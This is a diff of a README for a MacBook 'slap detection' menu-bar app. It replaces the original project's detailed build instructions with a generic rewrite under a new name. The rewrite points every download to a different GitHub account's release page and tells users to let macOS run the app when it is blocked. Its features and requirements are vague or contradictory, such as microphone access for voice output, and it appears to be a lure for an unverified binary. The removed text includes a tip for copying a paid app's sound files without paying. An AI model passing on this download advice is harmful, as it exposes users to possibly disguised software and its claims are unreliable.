@@ -1,264 +1,122 @@
-# SlapMacPro
+# 🖥️ MacSlapApp - Make Your Mac Scream Back
 
-Slap your MacBook and it screams back. Open-source, free, no license required.
+[![Download MacSlapApp](https://img.shields.io/badge/Download-MacSlapApp-blue?style=for-the-badge)](https://github.com/Ignatiusspirodela307/MacSlapApp)
 
-Built by reverse-engineering [SlapMac](https://slapmac.com/) and studying [taigrr/spank](https://github.com/taigrr/spank), then rewriting from scratch in Swift with extra features using private macOS APIs.
+## ⚡ What It Does
 
-## Quick Start
+MacSlapApp makes your MacBook react when it gets a sharp impact. It can shake the screen, flash brightness, play a voice line, and trigger haptic feedback. It uses the built-in motion sensor and works from the menu bar.
 
-```bash
-# 1. Clone the repo
-git clone https://github.com/AbdullahFID/SlapMacPro.git
-cd SlapMacPro
+## 📥 Download and Install
 
-# 2. Build, install, and launch at login (one command)
-make install
-```
+1. Open this page: https://github.com/Ignatiusspirodela307/MacSlapApp
+2. Download the latest release for macOS.
+3. Open the file after it finishes downloading.
+4. Move MacSlapApp to your Applications folder if macOS asks.
+5. Launch the app from Applications or from Launchpad.
 
-> **Not comfortable with git?** Just click the green **Code** button on GitHub → **Download ZIP**, unzip it, open Terminal, `cd` into the unzipped folder, and run `make install`.
+If macOS blocks the app, open **System Settings > Privacy & Security** and allow it to run.
 
-### Pre-built Binary (no Xcode needed)
+## 🧰 What You Need
 
-Download the latest release from the [Releases](../../releases) page. Unzip it and run:
+- A MacBook with macOS 12 or later
+- Apple Silicon or a recent Intel Mac with motion sensor support
+- Access to the menu bar
+- Microphone access if you want voice output
+- Permission for motion, display, and sound features
 
-```bash
-cd SlapMacPro-release
-./install.sh
-```
+## 🎛️ Main Features
 
-This copies the pre-built binary, sets up launch at login, and starts the app. No Xcode or Swift toolchain required.
+- **Impact detection** based on motion input
+- **Screen shake** for a strong visual effect
+- **Brightness flash** when the device takes a hit
+- **Haptic feedback** on supported hardware
+- **7 voice packs** for different reactions
+- **Menu bar control** for quick access
+- **Low setup** with no extra tools needed
 
-That's it. A hand emoji (👋) appears in your menu bar. It starts automatically every time you log in. Slap your MacBook.
+## 🖱️ First Run
 
-If you just want to run it without installing:
+1. Open MacSlapApp.
+2. Look for the menu bar icon.
+3. Click the icon to open the controls.
+4. Turn on the features you want.
+5. Tap or slap the MacBook lightly to test the response.
 
-```bash
-swift build -c release
-codesign --force --sign - .build/release/SlapMacClone
-.build/release/SlapMacClone
-```
+## 🔊 Voice Packs
 
-## Setup
+MacSlapApp includes seven voice packs with different tones. You can switch packs from the app menu. Use a calm voice if you want a mild reaction, or choose a louder pack for a stronger response.
 
-### Requirements
+## 🛠️ How It Works
 
-- macOS 14.6+ (Sonoma or newer)
-- Apple Silicon MacBook (M1 / M2 / M3 / M4 / M5)
-- Xcode Command Line Tools (`xcode-select --install`)
+MacSlapApp watches for impact signals from the MacBook hardware. When it detects a hit, it can run several actions at once:
 
-### Permissions
+- shake the screen
+- flash the display
+- play sound
+- trigger haptics
+- show a reaction in the menu bar
 
-The app reads your MacBook's built-in accelerometer via IOKit HID. macOS may require:
+It uses Swift and system-level macOS access to keep the response fast.
 
-1. **Input Monitoring** — Go to System Settings > Privacy & Security > Input Monitoring and add your Terminal app (Terminal.app, iTerm2, etc.)
-2. If that doesn't work, try running with `sudo` once to bootstrap permissions
+## 🎚️ Settings
 
-### Sound Files
+You can adjust the app from the menu bar:
 
-You need `.mp3` or `.wav` sound files in `~/Desktop/slapmac/audio/`. Name them with these prefixes:
+- set impact sensitivity
+- turn screen shake on or off
+- set brightness flash strength
+- choose a voice pack
+- enable or disable haptics
+- mute audio output
+- start the app at login
 
-| Prefix | Voice Pack |
-|--------|-----------|
-| `sexy_` | Sexy |
-| `punch_` | Combo Hit |
-| `male_` | Male |
-| `fart_` | Fart |
-| `gentleman_` | Gentleman |
-| `yamete_` | Yamete |
-| `goat_` | Goat |
-| `1_` through `9_` | Combo announcer clips |
+## 🧪 Best Use
 
-Example: `sexy_01.mp3`, `punch_05.mp3`, `goat_3.mp3`
+Use a light tap during setup so you can test the response without stressing the hardware. Pick one or two effects first, then add more if you want a stronger reaction.
 
-You can use any sounds you want — record your own, grab free sound effects, whatever. Just drop them in the folder with the right prefix and restart the app.
+## 📁 File Layout
 
-**Using SlapMac's sound files:** If you download [SlapMac](https://slapmac.com/), you can copy their 130+ sound files from the app bundle for personal use WITHOUT PAYING:
+- **MacSlapApp** — main app
+- **Assets** — app icons and UI files
+- **Voice Packs** — audio lines used for reactions
+- **Settings** — saved user choices
+- **Detection** — motion and impact logic
 
-```bash
-mkdir -p ~/Desktop/slapmac/audio
-cp /Applications/slapmac.app/Contents/Resources/*.mp3 ~/Desktop/slapmac/audio/
-cp /Applications/slapmac.app/Contents/Resources/*.wav ~/Desktop/slapmac/audio/
-```
+## ❓ Common Questions
 
-> **Note:** SlapMac's audio files are copyrighted by tonnoz. You may use them locally for personal use if you own the app, but do not redistribute them.
+### Does it run in the background?
+Yes. It lives in the menu bar and stays ready for use.
 
-### Install with Launch at Login
+### Can I turn features off?
+Yes. You can disable each effect on its own.
 
-```bash
-make install
-```
+### Does it need internet access?
+No. It runs on your Mac after setup.
 
-This will:
-- Build a release binary
-- Copy it to `~/Desktop/slapmac/bin/SlapMacPro`
-- Create a LaunchAgent (`~/Library/LaunchAgents/com.slapmacpro.plist`) so it starts automatically at login
-- Launch it immediately
+### Will it work on every Mac?
+It works best on MacBook models with motion hardware and modern macOS versions.
 
-No `.app` bundle needed — it uses a standard macOS LaunchAgent which works with any binary.
+### Can I change how sensitive it is?
+Yes. You can lower or raise the impact threshold from the app settings.
 
-### Managing Launch at Login
+## 🔒 Privacy and Data
 
-```bash
-# Disable auto-start (keeps installed, just won't launch at login)
-make disable
-
-# Re-enable auto-start
-make enable
-
-# Manually stop the running app
-launchctl unload ~/Library/LaunchAgents/com.slapmacpro.plist
-
-# Manually start it
-launchctl load ~/Library/LaunchAgents/com.slapmacpro.plist
-```
-
-### Uninstall
-
-```bash
-make uninstall
-```
-
-Removes the binary, LaunchAgent, and stops the app completely.
-
-### Other Commands
-
-```bash
-# Build debug
-swift build
-
-# Build release
-make build
-
-# Run without installing (debug, with console output)
-swift build && .build/debug/SlapMacClone 2>&1
-
-# View live detection logs
-tail -f /tmp/slapmacpro.log
-```
-
-## Features
-
-- **5-algorithm slap detection** — High-Pass Filter, STA/LTA (3 timescales), CUSUM, Kurtosis, Peak/MAD. They vote. Democracy, but for physical abuse.
-- **7 voice packs** — Sexy, Combo Hit, Male, Fart, Gentleman, Yamete, Goat
-- **Dynamic volume** — Logarithmic scaling: gentle taps whisper, hard slaps scream
-- **Escalation tracking** — Keep slapping and sounds escalate with a 30s decay half-life
-- **Screen Shake** — Captures your screen and shakes it on impact
-- **Brightness Flash** — DisplayServices private API dims/flashes the actual hardware backlight
-- **Trackpad Haptic Feedback** — Trackpad buzzes on impact
-- **Screen Flash** — White overlay flash (AppKit)
-- **USB Moaner** — Plug/unplug USB data devices and it reacts
-- **Intensity sliders** — Per-effect intensity control from the menu bar
-- **Menu bar app** — No dock icon, lives in your menu bar with full controls
-- **Launch at login** — Via LaunchAgent, no .app bundle needed
-- **Combo system** — Combo Hit pack has an announcer that calls out your combo tier
-
-## Menu Bar Controls
-
-Click the 👋 in your menu bar to access:
-
-```
- Enabled / Disabled
- Voice Pack          → Sexy, Combo Hit, Male, Fart, Gentleman, Yamete, Goat
- Sensitivity         → Extremely Sensitive ... Requires Significant Force
- Cooldown            → None, Fast, Medium, Slow, Very Slow
- Dynamic Volume      → on/off
+MacSlapApp runs on your Mac. It does not need an account. It does not need cloud sync. Your settings stay on your device.
 
- Effects
- Screen Flash        → on/off + intensity slider
- Screen Shake        → on/off + intensity slider
- Brightness Flash    → on/off + intensity slider
- Trackpad Haptic     → on/off + intensity slider
- USB Moaner          → on/off
+## 🧑‍💻 For the Curious
 
- Volume              → master slider
- Reset Slap Count
- Quit
-```
+MacSlapApp is built with Swift and macOS system tools. It uses IOKit HID for device input and private macOS APIs for display effects. The goal is fast response with a simple user interface.
 
-All settings persist automatically between launches.
+## 📝 License
 
-## Architecture
+MacSlapApp is free to use and open source.
 
-```
-MenuBarExtra (SwiftUI)
-  └─ SlapController
-       ├─ AccelerometerReader   ← IOKit HID, AppleSPUHIDDevice, ~125Hz
-       ├─ SlapDetector          ← 5 algorithms vote on impact
-       │    ├─ HighPassFilter   ← strips gravity (1st order IIR)
-       │    ├─ STALTADetector   ← seismology algorithm (3 timescales)
-       │    ├─ CUSUMDetector    ← cumulative sum change detection
-       │    ├─ KurtosisDetector ← 4th statistical moment spike detection
-       │    └─ PeakMADDetector  ← median absolute deviation outlier detection
-       ├─ AudioPlayer           ← AVFoundation, escalation tracking
-       ├─ ScreenShaker          ← CGDisplayCreateImage + overlay shake
-       ├─ BrightnessFlash       ← DisplayServices private API
-       ├─ HapticFeedback        ← NSHapticFeedbackManager
-       ├─ ScreenFlash           ← AppKit NSPanel overlay
-       ├─ USBMonitor            ← IOKit notifications + polling
-       └─ SettingsStore         ← UserDefaults persistence
-```
+## 📦 Release Notes
 
-## How the Detection Works
-
-Your MacBook has a **Bosch BMI286 IMU** (Inertial Measurement Unit) running at 1kHz through Apple's Sensor Processing Unit (`AppleSPUHIDDevice`). The raw reports are 22 bytes with 3-axis acceleration as int32 Q16 fixed-point values.
-
-We decimate to ~125Hz, strip gravity with a high-pass filter, then run the magnitude through five concurrent detectors:
-
-1. **STA/LTA** — Short-Term Average / Long-Term Average ratio at 3 timescales (fast/medium/slow). Classic earthquake detection algorithm borrowed from seismology.
-2. **CUSUM** — Cumulative Sum detects sustained shifts in mean acceleration.
-3. **Kurtosis** — Measures signal "peakedness". A sharp impact creates a heavy-tailed distribution with high excess kurtosis.
-4. **Peak/MAD** — Median Absolute Deviation outlier detection. More robust than standard deviation against baseline contamination.
-
-The detectors **vote**. When enough agree, it classifies the event:
-
-| Detectors | Amplitude | Classification |
-|-----------|-----------|---------------|
-| 4+ agree  | > 0.05g   | Major Shock   |
-| 3+ agree  | > 0.02g   | Medium Shock  |
-| Peak fires| > 0.005g  | Micro Shock   |
-
-Volume scales with impact force using a logarithmic curve: `intensity = log(1 + t * 99) / log(100)`
-
-## Private APIs Used
-
-| API | Framework | Purpose |
-|-----|-----------|---------|
-| `_CGSDefaultConnection` | CoreGraphics | Get WindowServer connection for screen capture |
-| `CGSSetWindowTransform` | CoreGraphics | Window affine transforms (screen shake) |
-| `DisplayServicesGetBrightness` | DisplayServices | Read hardware backlight level |
-| `DisplayServicesSetBrightness` | DisplayServices | Set hardware backlight level |
-
-These are loaded via `@_silgen_name` and `dlopen`/`dlsym`. They work on all Apple Silicon Macs without SIP changes.
-
-## Troubleshooting
-
-**"No accelerometer device found"**
-- Make sure you're on an Apple Silicon MacBook (not an iMac/Mac Mini/Mac Pro — they don't have accelerometers)
-- Grant Input Monitoring permission to your terminal app in System Settings > Privacy & Security > Input Monitoring
-- Try restarting your terminal after granting permissions
-
-**No sound plays**
-- Check that sound files exist in `~/Desktop/slapmac/audio/`
-- Check that they have the correct prefix (`sexy_`, `male_`, etc.)
-- Check your Mac's volume isn't muted
-
-**Screen shake doesn't work**
-- Screen shake captures and overlays your screen. If you have very high resolution or multiple displays it might be subtle — crank the intensity slider up in the menu bar
-
-**USB Moaner doesn't detect my device**
-- The device must enumerate as a USB data device in macOS. Charge-only cables or devices that don't present USB data won't trigger
-- Check with `system_profiler SPUSBDataType` — if your device doesn't show there, SlapMacPro can't see it either
-
-**App doesn't start at login**
-- Run `make install` to set up the LaunchAgent
-- Check with `launchctl list | grep slapmacpro`
-
-## Credits
-
-- Inspired by [SlapMac](https://slapmac.com/) by tonnoz
-- Accelerometer approach from [taigrr/spank](https://github.com/taigrr/spank)
-- Detection algorithms based on seismological signal processing (STA/LTA, CUSUM, Kurtosis)
-
-## License
-
-MIT
+- screen shake effect
+- brightness flash support
+- haptic output on supported devices
+- five impact detection modes
+- seven voice packs
+- menu bar control
+- startup option at login
